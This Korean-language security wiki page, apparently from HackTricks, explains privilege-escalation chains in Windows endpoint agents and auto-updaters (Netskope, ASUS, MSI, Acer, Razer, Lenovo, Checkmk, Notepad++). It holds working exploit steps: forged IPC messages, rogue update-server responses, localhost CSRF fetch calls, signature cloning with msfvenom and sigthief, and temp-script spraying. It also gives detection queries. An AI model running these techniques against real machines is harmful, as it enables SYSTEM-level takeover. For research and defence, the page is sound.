# Enterprise Auto-Updaters 및 Privileged IPC 악용 (예: Netskope, ASUS 및 MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 낮은 마찰의 IPC surface와 privileged update flow를 노출하는 enterprise endpoint agents 및 updaters에서 발견되는 Windows local privilege escalation chain의 한 종류를 일반화합니다. 대표적인 예로 Netskope Client for Windows < R129 (CVE-2025-0309)가 있으며, low-privileged user가 attacker-controlled server로 enrollment를 유도한 다음 SYSTEM service가 설치하는 malicious MSI를 전달할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

유사한 제품에 재사용할 수 있는 핵심 아이디어:
- privileged service의 localhost IPC를 악용하여 attacker server로 re-enrollment 또는 reconfiguration을 강제합니다.
- vendor의 update endpoints를 구현하고, rogue Trusted Root CA를 전달한 뒤 updater가 malicious “signed” package를 가리키도록 합니다.
- 취약한 signer checks (CN allow-lists), optional digest flags 및 lax MSI properties를 우회합니다.
- IPC가 “encrypted”인 경우 registry에 저장된 world-readable machine identifiers에서 key/IV를 도출합니다.
- service가 image path/process name으로 callers를 제한하는 경우, allow-listed process에 inject하거나 하나를 suspended 상태로 생성한 뒤 minimal thread-context patch를 통해 DLL을 bootstrap합니다.

---
## 1) localhost IPC를 통한 attacker server로의 enrollment 강제

많은 agents는 localhost TCP를 통해 SYSTEM service와 JSON으로 통신하는 user-mode UI process를 함께 제공합니다.

Netskope에서 확인된 내용:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) claims가 backend host (예: AddonUrl)를 제어하는 JWT enrollment token을 생성합니다. signature가 필요하지 않도록 alg=None을 사용합니다.
2) JWT 및 tenant name과 함께 provisioning command를 호출하는 IPC message를 전송합니다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) service가 enrollment/config을 위해 rogue server에 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

참고:
- caller verification이 path/name 기반인 경우, allow-listed vendor binary에서 요청을 시작합니다(§4 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) update channel을 hijacking하여 SYSTEM으로 code 실행

client가 사용자의 server와 통신하기 시작하면, 예상되는 endpoints를 구현하고 client가 attacker MSI를 가리키도록 유도합니다. 일반적인 sequence:

1) /v2/config/org/clientconfig → 매우 짧은 updater interval이 포함된 JSON config를 반환합니다. 예:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. service는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → malicious MSI와 fake version을 가리키는 metadata를 제공합니다.

실제 환경에서 흔히 확인되는 검사를 우회하는 방법:
- Signer CN allow-list: service는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 일치하는지만 확인할 수 있습니다. rogue CA로 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 benign MSI property를 포함합니다. install 시 enforcement가 없습니다.
- Optional digest enforcement: config flag(예: check_msi_digest=false)가 추가적인 cryptographic validation을 비활성화합니다.

그 결과 SYSTEM service가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치하고 NT AUTHORITY\SYSTEM 권한으로 arbitrary code를 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass lesson: vendor가 update source를 cryptographically authenticating하는 대신 소수의 “trusted” domain을 allow-list하는 방식으로 대응한다면, 여전히 traffic을 원하는 곳으로 유도할 수 있는 vendor-owned redirector 또는 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 research에서 R129-era allow-list가 attacker-controlled Azure App Service content를 proxy하는 `rproxy.goskope.com`을 통해 여전히 악용될 수 있음이 확인되었습니다. hostname allow-list는 trust boundary가 아니라 speed bump로 취급해야 합니다.<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData field로 감쌌습니다. Reversing 결과, 모든 user가 읽을 수 있는 registry values에서 key/IV를 파생한 AES가 사용되고 있었습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers는 encryption을 재현하고 standard user 권한으로 유효한 encrypted command를 전송할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup> General tip: agent가 갑자기 IPC를 “encrypt”하기 시작했다면 HKLM 아래의 device IDs, product GUIDs, install IDs가 material로 사용되는지 확인하세요.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

일부 service는 TCP connection의 PID를 resolve한 뒤 image path/name을 Program Files 아래에 위치한 allow-listed vendor binary(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교하여 peer를 authenticate하려고 합니다.

실용적인 bypass 두 가지:
- allow-listed process(예: nsdiag.exe)에 DLL injection을 수행하고 해당 process 내부에서 IPC를 proxy합니다.
- allow-listed binary를 suspended 상태로 spawn한 뒤 CreateRemoteThread 없이 proxy DLL을 bootstrap합니다(§5 참조). 이를 통해 driver-enforced tamper rules를 충족합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products는 protected process에 대한 handle에서 dangerous rights를 제거하기 위해 minifilter/OB callbacks driver(예: Stadrv)를 제공하는 경우가 많습니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME을 제거합니다.
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한합니다.

이러한 제약을 준수하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED를 사용하여 vendor binary를 CreateProcess합니다.
2) 여전히 허용되는 handle을 획득합니다: process에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, thread에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에서 code를 patch하는 경우 THREAD_RESUME만)를 사용합니다.
3) ntdll!NtContinue(또는 초기에 반드시 매핑되는 다른 thunk)를 DLL path에서 LoadLibraryW를 호출한 다음 원래 위치로 jump back하는 작은 stub으로 덮어씁니다.
4) ResumeThread를 수행하여 in-process에서 stub을 trigger하고 DLL을 load합니다.

이미 protected process인 process에 PROCESS_CREATE_THREAD 또는 PROCESS_SUSPEND_RESUME을 사용하지 않고 process를 직접 생성했으므로 driver의 policy를 충족합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin)은 rogue CA, malicious MSI signing을 자동화하고 필요한 endpoint인 /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate를 제공합니다.<sup>[[3]](#references)</sup>
- UpSkope는 arbitrary IPC message를 생성하는 custom IPC client이며, optionally AES-encrypted IPC message를 지원하고 allow-listed binary에서 originate하기 위한 suspended-process injection을 포함합니다.<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

새로운 endpoint agent 또는 motherboard “helper” suite를 분석할 때, 다음과 같은 quick workflow만으로도 유망한 privesc target을 보고 있는지 대체로 판단할 수 있습니다.<sup>[[6]](#references)</sup>

1) loopback listener를 enumerate하고 vendor process로 역추적합니다:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 후보 named pipes 열거:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin 기반 IPC 서버에서 사용하는 registry-backed routing data 수집:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 먼저 user-mode client에서 endpoint 이름, JSON 키, command ID를 추출합니다. Packed Electron/.NET 프런트엔드는 전체 스키마를 자주 leak합니다:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 결국 프로세스를 실행하는 코드 경로만이 아니라, 실제 신뢰 조건을 추적하라:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
우선순위를 높일 가치가 있는 패턴:
- `CryptQueryObject`/certificate parsing에 `WinVerifyTrust`가 없는 경우, 대개 “certificate가 존재한다”는 사실을 “certificate가 trusted하다”는 의미로 취급한 것이므로, certificate cloning이나 기타 fake-signer 트릭이 가능하다.
- `Origin`, `Referer`, download URLs, process names 또는 signer CN에 대한 substring/suffix 검사는 authentication이 아니다. `contains(".vendor.com")`은 attacker-controlled lookalike domain으로 악용되는 경우가 많다.
- low-privileged GUI가 “file is trusted”라고 결정하고 SYSTEM broker가 그 결과를 단순히 소비한다면, client-side DLL/JS를 patch하거나 재구현하는 것만으로도 boundary를 완전히 우회할 수 있다(Razer-style split validation).
- broker가 payload를 `%TEMP%`/`C:\Windows\Temp`에 복사한 다음 해당 경로에서 이를 검증하거나 schedule한다면, 즉시 TOCTOU replacement window와 더 약한 검사를 노출하는 sibling plugin module의 대체 `ExecuteTask()` wrapper를 테스트해야 한다.<sup>[[6]](#references)</sup>

named-pipe-heavy target의 경우, protocol을 깊이 있게 reversing하기 전에 PipeViewer를 사용하면 약한 DACL과 remotely reachable pipe를 빠르게 확인할 수 있다.<sup>[[11]](#references)</sup>

target이 caller를 PID, image path 또는 process name만으로 authenticate한다면, 이를 boundary가 아니라 단순한 장애물로 간주해야 한다. legitimate client에 inject하거나 allow-listed process에서 connection을 생성하는 것만으로도 server의 검사를 통과하는 경우가 많다. 특히 named pipe에 대해서는 [client impersonation and pipe abuse에 관한 이 페이지](named-pipe-client-impersonation.md)에서 해당 primitive를 더 자세히 설명한다.

---
## 8) vendor signature로만 authenticated되는 modular add-in broker (Lenovo Vantage pattern)

새롭게 주목할 만한 변형은 **signed-client RPC broker**이다. low-privileged Lenovo-signed desktop process가 SYSTEM service와 통신하고, service는 `%ProgramData%` 아래의 XML-described add-in 집합으로 JSON command를 route한다. **허용된 signed client 내부에서** code execution을 달성하면, 모든 `runas="system"` contract가 attack surface의 일부가 된다.<sup>[[15]](#references)</sup>

Lenovo Vantage research에서 관찰된 high-value primitive:
- **vendor가 서명했다는 이유로 caller를 신뢰**: researchers는 Lenovo-signed EXE를 writable directory에 복사하고 DLL side-load(`profapi.dll`)을 충족하여, service가 이미 신뢰하는 client 내부에서 arbitrary code가 실행되는 authenticated context에 도달했다.
- **Manifest-driven attack surface discovery**: add-in은 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 아래에 선언되어 있다. 여러 contract가 `SYSTEM`으로 실행되므로, 해당 manifest를 enumerate하면 broker 자체를 reversing하는 것보다 실제 privileged verb를 더 빠르게 확인할 수 있다.
- **authenticated channel 뒤의 per-command bug**: trusted client 내부에 진입한 후, 공개 research에서는 update/install verb의 path-traversal + race condition, privileged settings database의 raw-SQL abuse, 그리고 intended hive 외부에 write할 수 있게 하는 substring-based registry path check가 확인되었다.

target에서 유용한 recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
실무적 요점: helper suite가 먼저 **caller process**를 인증한 다음 수십 개의 plugin/add-in command로 요청을 전달하는 broker를 노출한다면, front-door trust check를 우회한 것만으로 끝내지 마세요. manifest/contract table을 덤프하고 각 high-privilege verb를 개별적으로 fuzz하세요. 인증된 channel에는 보통 여러 second-stage bug가 숨겨져 있습니다.

---
## 1) 권한이 높은 HTTP API를 대상으로 한 Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 user-mode HTTP service (ADU.exe)를 제공하며, `https://driverhub.asus.com`에서 전달된 browser call을 예상합니다. Origin filter는 Origin header와 `/asus/v1.0/*`에서 노출되는 download URL에 대해 단순히 `string_contains(".asus.com")`를 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같은 attacker-controlled host도 검사를 통과하고 JavaScript에서 state-changing request를 전송할 수 있습니다.<sup>[[6]](#references)</sup> 추가적인 bypass pattern은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참고하세요.

실제 흐름:
1) `.asus.com`을 포함하는 domain을 등록하고 그곳에서 malicious webpage를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 privileged endpoint (예: `Reboot`, `UpdateApp`)를 호출합니다.
3) handler가 예상하는 JSON body를 전송합니다. packed frontend JS에 아래 schema가 표시되어 있습니다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Origin header를 신뢰되는 값으로 spoofed하면 아래에 표시된 PowerShell CLI도 성공한다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
따라서 attacker site를 브라우저로 방문하기만 해도 SYSTEM helper를 구동하는 1-click (또는 `onload`를 통한 0-click) local CSRF가 됩니다.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`은 JSON body에 지정된 임의의 executable을 다운로드하고 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 cache합니다. Download URL validation은 동일한 substring logic을 재사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`도 허용됩니다. 다운로드 후 ADU.exe는 PE에 signature가 포함되어 있고 Subject string이 ASUS와 일치하는지만 확인한 뒤 실행합니다. `WinVerifyTrust`도, chain validation도 없습니다.

이 flow를 weaponize하려면:
1) payload를 생성합니다(예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 signer를 payload에 clone합니다(예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `.asus.com` lookalike domain에서 `pwn.exe`를 host하고 위의 browser CSRF를 통해 UpdateApp을 trigger합니다.

Origin과 URL filter가 모두 substring-based이고 signer check가 string만 비교하므로, DriverHub은 attacker binary를 가져와 elevated context에서 실행합니다.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM service는 각 frame이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`로 구성된 TCP protocol을 expose합니다. 핵심 component (Component ID `0f 27 00 00`)에는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`가 포함되어 있습니다. 해당 handler는 다음을 수행합니다.
1) 제공된 executable을 `C:\Windows\Temp\MSI Center SDK.exe`로 copy합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 signature를 확인합니다(certificate subject는 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치해야 하며 `WinVerifyTrust`가 성공해야 합니다).
3) attacker-controlled arguments를 사용해 temp file을 SYSTEM으로 실행하는 scheduled task를 생성합니다.

copy된 file은 verification과 `ExecuteTask()` 사이에서 lock되지 않습니다. attacker는 다음을 수행할 수 있습니다.
- legitimate MSI-signed binary를 가리키는 Frame A를 전송합니다(signature check가 통과하고 task가 queue에 들어가도록 보장).
- verification이 완료된 직후 `MSI Center SDK.exe`를 overwrite하도록 malicious payload를 가리키는 반복적인 Frame B message와 race합니다.

scheduler가 실행되면 original file을 validation했음에도 overwrite된 payload를 SYSTEM으로 실행합니다. Reliable exploitation을 위해서는 두 개의 goroutine/thread가 TOCTOU window를 차지할 때까지 CMD_AutoUpdateSDK를 spam하도록 해야 합니다.<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`가 load하는 모든 plugin/DLL은 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID를 받습니다. frame의 첫 4바이트가 해당 component를 선택하므로, attacker는 command를 임의의 module로 route할 수 있습니다.
- Plugin은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`을 expose하며, **signature validation 없이** `API_Support.EX_Task::ExecuteTask()`를 직접 호출합니다. 따라서 모든 local user가 이를 `C:\Users\<user>\Desktop\payload.exe`로 지정해 deterministic하게 SYSTEM execution을 얻을 수 있습니다.
- Wireshark로 loopback을 sniff하거나 dnSpy에서 .NET binary를 instrument하면 Component ↔ command mapping을 빠르게 확인할 수 있으며, 이후 custom Go/ Python client로 frame을 replay할 수 있습니다.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM)는 `\\.\pipe\treadstone_service_LightMode`를 expose하며, 해당 discretionary ACL은 remote client(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. file path와 함께 command ID `7`을 전송하면 service의 process-spawning routine이 호출됩니다.
- client library는 args와 함께 magic terminator byte (113)를 serialize합니다. Frida/`TsDotNetLib`를 사용한 dynamic instrumentation([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)의 instrumentation tips 참고)을 통해 native handler가 이 값을 `CreateProcessAsUser` 호출 전에 `SECURITY_IMPERSONATION_LEVEL` 및 integrity SID로 매핑한다는 것을 확인할 수 있습니다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 full SYSTEM token을 유지하고 high-integrity SID (`S-1-16-12288`)를 설정하는 generic branch로 진입합니다. 따라서 spawned binary는 local 및 cross-machine 모두에서 unrestricted SYSTEM으로 실행됩니다.
- 이를 exposed installer flag (`Setup.exe -nocheck`)와 결합하면 lab VM에서도 ACC를 실행하고 vendor hardware 없이 pipe를 테스트할 수 있습니다.<sup>[[6]](#references)</sup>

이러한 IPC bug는 localhost service가 mutual authentication(ALPC SID, `ImpersonationLevel=Impersonation` filter, token filtering)을 적용해야 하는 이유와 각 module의 “run arbitrary binary” helper가 동일한 signer verification을 공유해야 하는 이유를 보여줍니다.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4는 이 family에 또 다른 유용한 pattern을 추가했습니다. low-privileged user가 `RzUtility.Elevator`를 통해 process를 launch하도록 COM helper에 요청할 수 있으며, trust decision은 privileged boundary 내부에서 robust하게 적용되지 않고 user-mode DLL(`simple_service.dll`)에 위임됩니다.

Observed exploitation path:
- COM object `RzUtility.Elevator`를 instantiate합니다.
- `LaunchProcessNoWait(<path>, "", 1)`을 호출해 elevated launch를 요청합니다.
- public PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE-signature gate를 patch out하여, attacker가 선택한 임의의 executable을 launch할 수 있도록 합니다.<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
일반적인 핵심 사항: “helper” suite를 reverse engineering할 때 localhost TCP나 named pipe에서 멈추지 마세요. `Elevator`, `Launcher`, `Updater`, `Utility`와 같은 이름을 가진 COM class를 확인한 다음, privileged service가 실제로 target binary 자체를 검증하는지, 아니면 patch 가능한 user-mode client DLL이 계산한 결과를 단순히 신뢰하는지 검증하세요. 이 패턴은 Razer를 넘어 일반화할 수 있습니다. high-privilege broker가 low-privilege 측에서 전달한 allow/deny 결정에 의존하는 분할 설계라면, 모두 privesc surface 후보입니다.


---
## MSI repair 중 예측 가능한 temp script 실행 (Checkmk Agent / CVE-2024-0670)

일부 Windows agent는 여전히 `C:\Windows\Temp`에 임시 `.cmd`를 작성하고 이를 `SYSTEM`으로 실행하는 방식으로 privileged action을 구현합니다. 파일명이 예측 가능하고 service가 기존 파일을 안전하게 다시 생성하지 않는다면, low-privileged user가 미래의 temp file을 **read-only**로 미리 생성하여 privileged process가 자체 script 대신 attacker-controlled content를 실행하게 만들 수 있습니다.

취약한 Checkmk Agent build에서 관찰된 내용:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package의 MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

Practical workflow:
1. 현재 process ID 또는 실행 중인 agent PID를 기반으로 현실적인 PID range를 추정합니다.
2. 짧은 **ASCII** `.cmd` payload를 작성합니다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` redirection 사용; batch file에는 UTF-16 PowerShell output을 사용하지 않음).
3. 후보 range 전체에 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`를 spray하고 각 파일을 read-only로 표시합니다.
4. cached MSI의 repair를 trigger하여 privileged service가 temp script를 다시 생성한 다음 실행하도록 합니다.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
취약한 제품이 Windows Installer로 설치된 경우, 복구를 트리거하기 전에 `C:\Windows\Installer` 아래의 무작위처럼 보이는 캐시된 MSI를 해당 제품 이름에 매핑하세요:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
운영 참고 사항:
- 대화형이 아닌 WinRM shell에서 `msiexec /fa`가 실패하고, 기존 desktop/disconnected session이 repair를 올바르게 트리거할 수 있는지 파악해야 할 때 `qwinsta`가 유용합니다.<sup>[[7]](#references)</sup>
- 이 패턴은 **world-writable 위치에 temp script를 준비한 후 SYSTEM 권한으로 실행하는** 다른 endpoint agent 및 updater에도 일반화할 수 있습니다. 예측 가능한 이름, exclusive create semantics의 부재, 필요할 때 트리거할 수 있는 repair/update flow를 테스트하세요.

---
## 취약한 updater 검증을 통한 원격 supply-chain hijack (WinGUp / Notepad++)

2025년 6월부터 2025년 12월 사이, Notepad++ update flow를 지원하는 hosting infrastructure를 침해한 attackers가 특정 victims에게 선택적으로 malicious manifest를 제공했습니다. 기존 WinGUp 기반 updater는 update authenticity를 완전히 검증하지 않았으므로, hostile XML response가 client를 attacker-controlled URL로 redirect할 수 있었습니다. 또한 client가 다운로드한 installer에 대해 trusted certificate chain과 유효한 PE signature를 모두 강제하지 않고 HTTPS content를 허용했기 때문에, victims는 trojanized NSIS `update.exe`를 다운로드하고 실행했습니다.<sup>[[12]](#references)[[13]](#references)</sup>

운영 flow (local exploit 불필요):
1. **Infrastructure interception**: CDN/hosting을 침해하고 malicious download URL을 가리키는 attacker metadata로 update check에 응답합니다.
2. **Trojanized NSIS**: installer가 payload를 fetch/execute하고 두 가지 execution chain을 악용합니다.
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe`를 포함하고 해당 binary의 search path에 malicious `log.dll`을 배치합니다. signed binary가 실행되면 Windows가 `log.dll`을 sideload하고, 이 DLL은 Chrysalis backdoor를 decrypt한 뒤 reflectively load합니다 (static detection을 방해하기 위해 Warbird-protected 및 API hashing 사용).
- **Scripted shellcode injection**: NSIS가 compiled Lua script를 실행합니다. 이 script는 Win32 API (예: `EnumWindowStationsW`)를 사용해 shellcode를 inject하고 Cobalt Strike Beacon을 stage합니다.<sup>[[12]](#references)</sup>

모든 auto-updater에 적용할 hardening/detection 핵심 사항:
- 다운로드한 installer에 대해 **certificate + signature verification**을 강제하고 (vendor signer를 pinning하고, 일치하지 않는 CN/chain을 거부), update manifest 자체에도 signature를 추가하세요 (예: XMLDSig). 검증되지 않은 manifest-controlled redirect를 차단하세요.
- **BYO signed binary sideloading**을 post-download detection pivot으로 취급하세요. signed vendor EXE가 canonical install path 외부에서 DLL name을 load할 때 (예: Bitdefender가 Temp/Downloads에서 `log.dll`을 load하는 경우), 그리고 updater가 temp에서 non-vendor signature를 가진 installer를 drop/execute할 때 alert를 생성하세요.
- 이 chain에서 관찰된 **malware-specific artifact**를 모니터링하세요 (generic pivot으로 유용): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` writes, Lua-driven shellcode injection stages.
- Notepad++는 v8.8.9 및 이후 버전에서 WinGUp을 강화했습니다. 이제 반환된 XML은 signed 상태이며 (XMLDSig), 최신 build는 transport만 신뢰하는 대신 다운로드한 installer에 대해 certificate + signature verification을 강제합니다.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>가 Notepad++가 아닌 설치 프로그램을 실행하는 경우</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

이러한 패턴은 서명되지 않은 manifest를 허용하거나 installer signer를 고정하지 못하는 모든 updater에 적용됩니다. network hijack + malicious installer + BYO-signed sideloading을 사용하면 “trusted” update로 위장한 remote code execution이 가능합니다.

---
## 참고 자료
- [1] [Advisory – Netskope Client for Windows – Rogue Server를 통한 Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – ASUS DriverHub, MSI Center, Acer Control Centre 및 Razer Synapse 4 Pwning](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent의 writable files를 통한 Local Privilege Escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent의 Privilege escalation](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors가 Notepad++ Supply Chain을 Exploit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
